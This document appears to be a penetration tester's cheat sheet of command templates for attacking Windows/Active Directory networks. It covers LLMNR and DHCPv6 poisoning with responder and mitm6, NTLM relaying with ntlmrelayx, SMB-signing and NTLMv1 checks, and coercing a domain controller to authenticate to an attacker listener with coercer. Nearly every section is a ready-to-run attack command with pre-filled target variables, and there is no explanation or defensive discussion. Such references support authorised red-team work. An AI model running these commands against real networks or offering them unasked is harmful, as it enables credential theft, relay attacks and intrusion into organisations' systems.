# Spoofing

## LLMNR Poisoning - responder

```
responder-http-on
responder-smb-on
responder -I <interface> -d -w
```

= interface: enp0s31f6

## SMB signing disabled - nmap

```
nmap -Pn --script smb-security-mode -p445 <target>
```

= target: $TARGETS/computers.list

## SMB signing disabled - cme

```
cme smb <target> --gen-relay-list <output_file>
```

= target: $TARGETS/computers.list

## LLMNR/MDNS/DHCP Poisoning - responder

```
responder-http-off
responder-smb-off
responder -I <interface> -d -w
```

= interface: enp0s31f6

## NTLM Relay with SOCKS (SMB) - ntlmrelayx

```
ntlmrelayx -tf <targets_file> -socks -smb2support
```

= targets_file: $TARGETS/relay_targets.list

## DHCPv6 Poisoning - mitm6 

```
mitm6 --interface <interface> --domain <domain>
```

= interface: enp0s31f6
= domain:

## Check NTLMv1 - cme

```
cme smb <target> -d <domain> -u <user> -p <password> -M ntlmv1
```

= target: $DC
= domain: $DOMAIN
= user: $USER
= password: $PASSWORD

## Coercer - ESC8 / NTLMv1

```
coercer -d <domain> -u <user> -p <password> -l <listener> -t <target>
```

= domain: $DOMAIN
= user: $USER
= password: $PASSWORD
= listener: $MY_IP
= target: $DC